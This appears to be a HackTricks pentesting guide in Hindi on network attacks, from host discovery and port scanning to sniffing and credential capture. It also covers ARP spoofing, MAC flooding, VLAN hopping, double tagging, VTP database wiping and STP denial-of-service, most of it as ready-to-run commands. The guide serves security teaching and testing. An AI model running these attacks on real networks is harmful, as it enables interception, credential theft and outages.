# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## बाहर से होस्ट खोजने के लिए

यह **संक्षिप्त अनुभाग** है कि **इंटरनेट** से **प्रतिक्रिया देने वाले IPs** को कैसे खोजें।\
इस स्थिति में आपके पास कुछ **IP का दायरा** (शायद कई **रेंज** भी) है और आपको बस यह पता करना है कि **कौन से IPs प्रतिक्रिया दे रहे हैं**।

### ICMP

यह यह पता लगाने का **सबसे आसान** और **तेज़** तरीका है कि कोई होस्ट चालू है या नहीं।\
आप कुछ **ICMP** पैकेट भेजने की कोशिश कर सकते हैं और **प्रतिक्रिया की उम्मीद** कर सकते हैं। सबसे आसान तरीका बस एक **इको अनुरोध** भेजना और प्रतिक्रिया की उम्मीद करना है। आप यह एक साधारण `ping` का उपयोग करके या **रेंज** के लिए `fping` का उपयोग करके कर सकते हैं।\
आप **nmap** का उपयोग करके अन्य प्रकार के ICMP पैकेट भेजने के लिए भी उपयोग कर सकते हैं (यह सामान्य ICMP इको अनुरोध-प्रतिक्रिया के लिए फ़िल्टर से बचने में मदद करेगा)।
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

यह बहुत सामान्य है कि सभी प्रकार के ICMP पैकेट फ़िल्टर किए जा रहे हैं। फिर, एक होस्ट के चालू होने की जांच करने के लिए, आप केवल **खुले पोर्ट खोजने** की कोशिश कर सकते हैं। प्रत्येक होस्ट के पास **65535 पोर्ट** होते हैं, इसलिए, यदि आपके पास "बड़ा" दायरा है, तो आप **प्रत्येक पोर्ट** की जांच नहीं कर सकते कि वह खुला है या नहीं, इससे बहुत समय लगेगा।\
फिर, आपको एक **तेज़ पोर्ट स्कैनर** ([masscan](https://github.com/robertdavidgraham/masscan)) और **सबसे अधिक उपयोग किए जाने वाले पोर्ट्स** की एक सूची की आवश्यकता है:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
आप इस चरण को `nmap` के साथ भी कर सकते हैं, लेकिन यह धीमा है और कुछ हद तक `nmap` को होस्ट की पहचान करने में समस्याएँ होती हैं।

### HTTP पोर्ट खोज

यह केवल एक TCP पोर्ट खोज है जो तब उपयोगी होती है जब आप **HTTP** **सेवाओं** की खोज पर ध्यान केंद्रित करना चाहते हैं:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP पोर्ट खोज

आप यह भी जांचने की कोशिश कर सकते हैं कि कुछ **UDP पोर्ट खुले** हैं या नहीं ताकि आप तय कर सकें कि आपको **एक होस्ट पर अधिक ध्यान देना चाहिए।** चूंकि UDP सेवाएँ आमतौर पर **कोई डेटा** के साथ **कोई प्रतिक्रिया नहीं देतीं** एक सामान्य खाली UDP प्रॉब पैकेट के लिए, यह कहना मुश्किल है कि कोई पोर्ट फ़िल्टर किया जा रहा है या खुला है। इसे तय करने का सबसे आसान तरीका यह है कि आप चल रही सेवा से संबंधित एक पैकेट भेजें, और चूंकि आप नहीं जानते कि कौन सी सेवा चल रही है, आपको पोर्ट नंबर के आधार पर सबसे संभावित सेवा को आज़माना चाहिए:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
nmap द्वारा प्रस्तावित लाइन हर होस्ट के **/24** रेंज में **शीर्ष 1000 UDP पोर्ट** का परीक्षण करेगी, लेकिन केवल यही करने में **>20min** लगेगा। यदि आपको **तेज़ परिणाम** चाहिए, तो आप [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) का उपयोग कर सकते हैं: `./udp-proto-scanner.pl 199.66.11.53/24` यह इन **UDP प्रॉब्स** को उनके **अपेक्षित पोर्ट** पर भेजेगा (एक /24 रेंज के लिए, यह केवल 1 मिनट लेगा): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP पोर्ट खोज
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

यहाँ आप लेखन के समय के सभी प्रसिद्ध Wifi हमलों का एक अच्छा गाइड पा सकते हैं:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Discovering hosts from the inside

यदि आप नेटवर्क के अंदर हैं, तो आप जो पहली चीज करना चाहेंगे वह है **अन्य होस्टों का पता लगाना**। **कितनी आवाज** आप कर सकते हैं/करना चाहते हैं, इसके आधार पर, विभिन्न क्रियाएँ की जा सकती हैं:

### Passive

आप इन उपकरणों का उपयोग करके एक जुड़े हुए नेटवर्क के अंदर होस्टों का निष्क्रिय रूप से पता लगा सकते हैं:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### सक्रिय

ध्यान दें कि [_**बाहर से होस्ट का पता लगाना**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP पोर्ट डिस्कवरी_) में टिप्पणी की गई तकनीकों को भी **यहां लागू किया जा सकता है**।\
लेकिन, चूंकि आप अन्य होस्ट के **समान नेटवर्क** में हैं, आप **अधिक चीजें** कर सकते हैं:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

ध्यान दें कि _Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) में टिप्पणी की गई तकनीकें भी **यहां लागू की जा सकती हैं**।\
लेकिन, चूंकि आप अन्य होस्ट के **समान नेटवर्क** में हैं, आप **अधिक चीजें** कर सकते हैं:

- यदि आप **subnet broadcast address** को **ping** करते हैं, तो पिंग **प्रत्येक होस्ट** तक पहुंचनी चाहिए और वे **आपको** **उत्तर** दे सकते हैं: `ping -b 10.10.5.255`
- **Network broadcast address** को पिंग करने पर आप **अन्य subnets** के अंदर होस्ट भी ढूंढ सकते हैं: `ping -b 255.255.255.255`
- होस्ट खोज करने के लिए `nmap` के `-PE`, `-PP`, `-PM` फ्लैग का उपयोग करें, जो क्रमशः **ICMPv4 echo**, **timestamp**, और **subnet mask requests** भेजते हैं: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan का उपयोग कंप्यूटरों को **नेटवर्क संदेश** के माध्यम से **चालू करने** के लिए किया जाता है। कंप्यूटर को चालू करने के लिए उपयोग किया जाने वाला जादुई पैकेट केवल एक पैकेट है जिसमें एक **MAC Dst** प्रदान किया गया है और फिर इसे **एक ही पैकेट** के अंदर **16 बार दोहराया** जाता है।\
फिर इस प्रकार के पैकेट आमतौर पर **ethernet 0x0842** में या **UDP पैकेट को पोर्ट 9** में भेजे जाते हैं।\
यदि **कोई \[MAC]** प्रदान नहीं किया गया है, तो पैकेट **broadcast ethernet** पर भेजा जाता है (और ब्रॉडकास्ट MAC वही होगा जो दोहराया जाएगा)।
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## होस्ट स्कैनिंग

एक बार जब आप सभी IPs (बाहरी या आंतरिक) का पता लगा लेते हैं जिन्हें आप गहराई से स्कैन करना चाहते हैं, तो विभिन्न क्रियाएँ की जा सकती हैं।

### TCP

- **खुला** पोर्ट: _SYN --> SYN/ACK --> RST_
- **बंद** पोर्ट: _SYN --> RST/ACK_
- **फिल्टर किया गया** पोर्ट: _SYN --> \[NO RESPONSE]_
- **फिल्टर किया गया** पोर्ट: _SYN --> ICMP संदेश_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP पोर्ट को स्कैन करने के लिए 2 विकल्प हैं:

- एक **UDP पैकेट** भेजें और यदि पोर्ट **बंद** है तो _**ICMP अप्राप्य**_ के लिए प्रतिक्रिया की जांच करें (कई मामलों में ICMP **फिल्टर** किया जाएगा इसलिए आपको यह जानकारी नहीं मिलेगी कि पोर्ट बंद है या खुला)।
- एक **फॉर्मेटेड डेटाग्राम** भेजें ताकि एक **सेवा** (जैसे, DNS, DHCP, TFTP, और अन्य, जो _nmap-payloads_ में सूचीबद्ध हैं) से प्रतिक्रिया प्राप्त की जा सके। यदि आपको एक **प्रतिक्रिया** मिलती है, तो पोर्ट **खुला** है।

**Nmap** "-sV" का उपयोग करके दोनों विकल्पों को **मिश्रित** करेगा (UDP स्कैन बहुत धीमे होते हैं), लेकिन ध्यान दें कि UDP स्कैन TCP स्कैन की तुलना में धीमे होते हैं:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** को **TCP (Transmission Control Protocol)** और **UDP (User Datagram Protocol)** के साथ उपयोग करने के लिए डिज़ाइन किया गया है। इसका मुख्य उद्देश्य IP नेटवर्क पर टेलीफोनी डेटा के परिवहन को सुविधाजनक बनाना है, जो **Signaling System 7 (SS7)** में पाए जाने वाले कई विश्वसनीयता सुविधाओं को दर्शाता है। **SCTP** **SIGTRAN** प्रोटोकॉल परिवार का एक मुख्य घटक है, जिसका उद्देश्य IP नेटवर्क पर SS7 संकेतों का परिवहन करना है।

**SCTP** के लिए समर्थन विभिन्न ऑपरेटिंग सिस्टम द्वारा प्रदान किया जाता है, जैसे **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, और **VxWorks**, जो टेली संचार और नेटवर्किंग के क्षेत्र में इसकी व्यापक स्वीकृति और उपयोगिता को दर्शाता है।

nmap द्वारा SCTP के लिए दो अलग-अलग स्कैन प्रदान किए जाते हैं: _-sY_ और _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS और IPS से बचाव

{{#ref}}
ids-evasion.md
{{#endref}}

### **अधिक nmap विकल्प**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### आंतरिक IP पतों का खुलासा

**गलत कॉन्फ़िगर किए गए राउटर, फ़ायरवॉल और नेटवर्क उपकरण** कभी-कभी **गैर-जनता स्रोत पतों** का उपयोग करके नेटवर्क प्रॉब्स का उत्तर देते हैं। **tcpdump** का उपयोग परीक्षण के दौरान निजी पतों से प्राप्त पैकेट्स की पहचान करने के लिए किया जा सकता है। विशेष रूप से, Kali Linux पर, पैकेट्स को **eth2 इंटरफ़ेस** पर कैप्चर किया जा सकता है, जो सार्वजनिक इंटरनेट से सुलभ है। यह ध्यान रखना महत्वपूर्ण है कि यदि आपकी सेटअप NAT या फ़ायरवॉल के पीछे है, तो ऐसे पैकेट्स को फ़िल्टर किया जा सकता है।
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing के माध्यम से आप कैप्चर किए गए फ्रेम और पैकेट की समीक्षा करके IP रेंज, सबनेट आकार, MAC पते और होस्टनाम के विवरण जान सकते हैं। यदि नेटवर्क गलत तरीके से कॉन्फ़िगर किया गया है या स्विचिंग फैब्रिक पर तनाव है, तो हमलावर पासिव नेटवर्क स्निफ़िंग के माध्यम से संवेदनशील सामग्री कैप्चर कर सकते हैं।

यदि एक स्विच किया गया ईथरनेट नेटवर्क सही तरीके से कॉन्फ़िगर किया गया है, तो आप केवल ब्रॉडकास्ट फ्रेम और अपने MAC पते के लिए निर्धारित सामग्री देखेंगे।

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
आप एक SSH सत्र के माध्यम से Wireshark का उपयोग करके रीयलटाइम में एक दूरस्थ मशीन से पैकेट कैप्चर कर सकते हैं।
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

स्पष्ट रूप से।

### Capturing credentials

आप [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) जैसे टूल का उपयोग करके pcap या लाइव इंटरफेस से क्रेडेंशियल्स को पार्स कर सकते हैं।

## LAN attacks

### ARP spoofing

ARP Spoofing में बिना किसी कारण के ARPResponses भेजना शामिल है ताकि यह संकेत दिया जा सके कि एक मशीन का IP हमारे डिवाइस के MAC के साथ है। फिर, पीड़ित ARP तालिका को बदल देगा और हर बार जब वह IP spoofed से संपर्क करना चाहता है, तो वह हमारी मशीन से संपर्क करेगा।

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

स्विच के CAM तालिका को ओवरफ्लो करें, विभिन्न स्रोत मैक पते के साथ बहुत सारे पैकेट भेजकर। जब CAM तालिका भर जाती है, तो स्विच हब की तरह व्यवहार करना शुरू कर देता है (सभी ट्रैफ़िक को ब्रॉडकास्ट करना)।
```bash
macof -i <interface>
```
इस आधुनिक स्विच में यह सुरक्षा कमी ठीक कर दी गई है।

### 802.1Q VLAN / DTP हमले

#### डायनामिक ट्रंकिंग

**डायनामिक ट्रंकिंग प्रोटोकॉल (DTP)** को एक लिंक लेयर प्रोटोकॉल के रूप में डिज़ाइन किया गया है ताकि ट्रंकिंग के लिए एक स्वचालित प्रणाली को सुगम बनाया जा सके, जिससे स्विच ट्रंक मोड (Trunk) या नॉन-ट्रंक मोड के लिए पोर्ट का स्वचालित चयन कर सकें। **DTP** का उपयोग अक्सर उप-आदर्श नेटवर्क डिज़ाइन का संकेत माना जाता है, जो केवल आवश्यकतानुसार ट्रंक को मैन्युअल रूप से कॉन्फ़िगर करने और उचित दस्तावेज़ीकरण सुनिश्चित करने के महत्व को उजागर करता है।

डिफ़ॉल्ट रूप से, स्विच पोर्ट को डायनामिक ऑटो मोड में संचालित करने के लिए सेट किया गया है, जिसका अर्थ है कि वे पड़ोसी स्विच द्वारा संकेत मिलने पर ट्रंकिंग शुरू करने के लिए तैयार हैं। एक सुरक्षा चिंता तब उत्पन्न होती है जब एक pentester या हमलावर स्विच से कनेक्ट होता है और एक DTP Desirable फ्रेम भेजता है, जिससे पोर्ट ट्रंक मोड में प्रवेश करता है। यह क्रिया हमलावर को STP फ्रेम विश्लेषण के माध्यम से VLANs की गणना करने और वर्चुअल इंटरफेस सेट करके VLAN विभाजन को दरकिनार करने की अनुमति देती है।

कई स्विच में डिफ़ॉल्ट रूप से DTP की उपस्थिति का उपयोग प्रतिकूलों द्वारा स्विच के व्यवहार की नकल करने के लिए किया जा सकता है, जिससे सभी VLANs के बीच ट्रैफ़िक तक पहुंच प्राप्त होती है। स्क्रिप्ट [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) का उपयोग एक इंटरफेस की निगरानी के लिए किया जाता है, यह प्रकट करता है कि स्विच डिफ़ॉल्ट, ट्रंक, डायनामिक, ऑटो, या एक्सेस मोड में है—जिसमें से केवल एक्सेस मोड VLAN हॉपिंग हमलों के प्रति प्रतिरक्षित है। यह उपकरण स्विच की सुरक्षा स्थिति का आकलन करता है।

यदि नेटवर्क की सुरक्षा कमी पहचानी जाती है, तो _**Yersinia**_ उपकरण का उपयोग DTP प्रोटोकॉल के माध्यम से "ट्रंकिंग सक्षम करने" के लिए किया जा सकता है, जिससे सभी VLANs से पैकेटों का अवलोकन किया जा सके।
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANs की गणना करने के लिए, DTP Desirable फ्रेम को स्क्रिप्ट [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** के साथ उत्पन्न करना भी संभव है। **कृपया किसी भी परिस्थिति में स्क्रिप्ट को बाधित न करें। यह हर तीन सेकंड में DTP Desirable इंजेक्ट करता है। **स्विच पर गतिशील रूप से बनाए गए ट्रंक चैनल केवल पांच मिनट तक जीवित रहते हैं। पांच मिनट बाद, ट्रंक गिर जाता है।**
```
sudo python3 DTPHijacking.py --interface eth0
```
मैं यह बताना चाहूंगा कि **Access/Desirable (0x03)** यह संकेत करता है कि DTP फ्रेम Desirable प्रकार का है, जो पोर्ट को Trunk मोड में स्विच करने के लिए कहता है। और **802.1Q/802.1Q (0xa5)** **802.1Q** एनकैप्सुलेशन प्रकार को दर्शाता है।

STP फ्रेम का विश्लेषण करके, **हम VLAN 30 और VLAN 60 के अस्तित्व के बारे में सीखते हैं।**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### विशिष्ट VLAN पर हमला करना

एक बार जब आप VLAN IDs और IPs मानों को जान लेते हैं, तो आप **एक विशिष्ट VLAN पर हमला करने के लिए एक वर्चुअल इंटरफेस कॉन्फ़िगर कर सकते हैं।**\
यदि DHCP उपलब्ध नहीं है, तो स्थिर IP पता सेट करने के लिए _ifconfig_ का उपयोग करें।
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

चर्चा की गई हमले **Dynamic Trunking और वर्चुअल इंटरफेस बनाना और अन्य VLANs के अंदर होस्ट का पता लगाना** को उपकरण द्वारा **स्वचालित रूप से किया जाता है**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

यदि एक हमलावर को **शिकार होस्ट का MAC, IP और VLAN ID** का मान पता है, तो वह **फ्रेम को डबल टैग** करने की कोशिश कर सकता है जिसमें इसका निर्दिष्ट VLAN और शिकार का VLAN हो और एक पैकेट भेज सकता है। चूंकि **शिकार हमलावर के साथ वापस कनेक्ट नहीं हो पाएगा**, इसलिए **हमलावर के लिए सबसे अच्छा विकल्प UDP के माध्यम से संवाद करना है** उन प्रोटोकॉल के लिए जो कुछ दिलचस्प क्रियाएँ कर सकते हैं (जैसे SNMP)।

हमलावर के लिए एक और विकल्प है **TCP पोर्ट स्कैन लॉन्च करना, एक IP को स्पूफ करना जो हमलावर द्वारा नियंत्रित है और शिकार द्वारा सुलभ है** (संभवतः इंटरनेट के माध्यम से)। फिर, हमलावर अपने दूसरे होस्ट में स्निफ कर सकता है यदि उसे शिकार से कुछ पैकेट मिलते हैं।

![](<../../images/image (190).png>)

इस हमले को करने के लिए आप scapy का उपयोग कर सकते हैं: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

यदि आपके पास **एक स्विच तक पहुंच है जिससे आप सीधे जुड़े हुए हैं**, तो आपके पास नेटवर्क के भीतर **VLAN विभाजन को बायपास करने** की क्षमता है। बस **पोर्ट को ट्रंक मोड में स्विच करें** (जिसे ट्रंक के रूप में भी जाना जाता है), लक्षित VLANs के IDs के साथ वर्चुअल इंटरफेस बनाएं, और एक IP पता कॉन्फ़िगर करें। आप पता को गतिशील रूप से (DHCP) मांगने की कोशिश कर सकते हैं या आप इसे स्थिर रूप से कॉन्फ़िगर कर सकते हैं। यह मामले पर निर्भर करता है।

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

कुछ वातावरणों में, जैसे कि अतिथि वायरलेस नेटवर्क, **पोर्ट आइसोलेशन (जिसे प्राइवेट VLAN भी कहा जाता है)** सेटिंग्स लागू की जाती हैं ताकि वायरलेस एक्सेस पॉइंट से जुड़े क्लाइंट एक-दूसरे के साथ सीधे संवाद न कर सकें। हालाँकि, एक तकनीक पहचानी गई है जो इन आइसोलेशन उपायों को बायपास कर सकती है। यह तकनीक या तो नेटवर्क ACLs की कमी का लाभ उठाती है या उनकी गलत कॉन्फ़िगरेशन का, जिससे IP पैकेट को एक राउटर के माध्यम से रूट किया जा सकता है ताकि उसी नेटवर्क पर एक अन्य क्लाइंट तक पहुंचा जा सके।

हमला एक **पैकेट बनाकर निष्पादित किया जाता है जो लक्ष्य क्लाइंट का IP पता ले जाता है लेकिन राउटर का MAC पता होता है**। इससे राउटर गलती से पैकेट को लक्षित क्लाइंट की ओर अग्रेषित कर देता है। यह दृष्टिकोण डबल टैगिंग हमलों में उपयोग की जाने वाली विधि के समान है, जहां पीड़ित के लिए सुलभ एक होस्ट को नियंत्रित करने की क्षमता का उपयोग सुरक्षा दोष का लाभ उठाने के लिए किया जाता है।

**हमले के मुख्य चरण:**

1. **पैकेट बनाना:** एक पैकेट विशेष रूप से लक्षित क्लाइंट के IP पते को शामिल करने के लिए तैयार किया जाता है लेकिन राउटर के MAC पते के साथ।
2. **राउटर व्यवहार का लाभ उठाना:** तैयार पैकेट राउटर की ओर भेजा जाता है, जो कॉन्फ़िगरेशन के कारण पैकेट को लक्षित क्लाइंट की ओर अग्रेषित करता है, प्राइवेट VLAN सेटिंग्स द्वारा प्रदान की गई आइसोलेशन को बायपास करता है।

### VTP Attacks

VTP (VLAN ट्रंकिंग प्रोटोकॉल) VLAN प्रबंधन को केंद्रीकृत करता है। यह VLAN डेटाबेस की अखंडता बनाए रखने के लिए संशोधन नंबरों का उपयोग करता है; किसी भी संशोधन से यह संख्या बढ़ जाती है। स्विच उच्च संशोधन नंबरों के साथ कॉन्फ़िगरेशन अपनाते हैं, अपने स्वयं के VLAN डेटाबेस को अपडेट करते हैं।

#### VTP डोमेन भूमिकाएँ

- **VTP सर्वर:** VLANs का प्रबंधन करता है—बनाता है, हटाता है, संशोधित करता है। यह डोमेन सदस्यों को VTP घोषणाएँ प्रसारित करता है।
- **VTP क्लाइंट:** अपने VLAN डेटाबेस को समन्वयित करने के लिए VTP घोषणाएँ प्राप्त करता है। इस भूमिका को स्थानीय VLAN कॉन्फ़िगरेशन संशोधनों से प्रतिबंधित किया गया है।
- **VTP ट्रांसपेरेंट:** VTP अपडेट में भाग नहीं लेता लेकिन VTP घोषणाओं को अग्रेषित करता है। VTP हमलों से अप्रभावित, यह शून्य का एक स्थायी संशोधन नंबर बनाए रखता है।

#### VTP विज्ञापन प्रकार

- **सारांश विज्ञापन:** VTP सर्वर द्वारा हर 300 सेकंड में प्रसारित किया जाता है, जो आवश्यक डोमेन जानकारी ले जाता है।
- **उपसमुच्चय विज्ञापन:** VLAN कॉन्फ़िगरेशन परिवर्तनों के बाद भेजा जाता है।
- **विज्ञापन अनुरोध:** एक VTP क्लाइंट द्वारा सारांश विज्ञापन का अनुरोध करने के लिए जारी किया जाता है, आमतौर पर उच्च कॉन्फ़िगरेशन संशोधन संख्या का पता लगाने के जवाब में।

VTP कमजोरियाँ केवल ट्रंक पोर्ट के माध्यम से ही उपयोग की जा सकती हैं क्योंकि VTP घोषणाएँ केवल उनके माध्यम से प्रसारित होती हैं। DTP हमले के बाद के परिदृश्यों में VTP की ओर मुड़ने की संभावना हो सकती है। Yersinia जैसे उपकरण VTP हमलों को सुविधाजनक बना सकते हैं, VLAN डेटाबेस को मिटाने के उद्देश्य से, प्रभावी रूप से नेटवर्क को बाधित करते हैं।

नोट: यह चर्चा VTP संस्करण 1 (VTPv1) से संबंधित है।
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Yersinia के ग्राफिकल मोड में, VLAN डेटाबेस को साफ़ करने के लिए सभी VTP VLANs को हटाने का विकल्प चुनें।

### STP हमले

**यदि आप अपने इंटरफेस पर BPDU फ्रेम कैप्चर नहीं कर सकते हैं, तो संभावना कम है कि आप STP हमले में सफल होंगे।**

#### **STP BPDU DoS**

कई BPDUs TCP (Topology Change Notification) या Conf (वे BPDUs जो तब भेजे जाते हैं जब टोपोलॉजी बनाई जाती है) भेजने से स्विच ओवरलोड हो जाते हैं और सही तरीके से काम करना बंद कर देते हैं।
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP हमला**

जब एक TCP भेजा जाता है, तो स्विच का CAM तालिका 15 सेकंड में हटा दिया जाएगा। फिर, यदि आप लगातार इस प्रकार के पैकेट भेज रहे हैं, तो CAM तालिका लगातार (या हर 15 सेकंड में) पुनः प्रारंभ होगी और जब यह पुनः प्रारंभ होती है, तो स्विच एक हब की तरह व्यवहार करता है।
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP रूट अटैक**

हमलावर स्विच के व्यवहार का अनुकरण करता है ताकि वह नेटवर्क का STP रूट बन सके। फिर, अधिक डेटा उसके माध्यम से गुजरेगा। यह तब दिलचस्प होता है जब आप दो अलग-अलग स्विचों से जुड़े होते हैं।\
यह BPDUs CONF पैकेट भेजकर किया जाता है जिसमें कहा जाता है कि **प्राथमिकता** मान वास्तविक रूट स्विच की वास्तविक प्राथमिकता से कम है।
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**यदि हमलावर 2 स्विचों से जुड़े हैं, तो वह नए पेड़ की जड़ बन सकता है और उन स्विचों के बीच सभी ट्रैफ़िक उसके माध्यम से गुजरेगा** (एक MITM हमला किया जाएगा)।
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP हमले

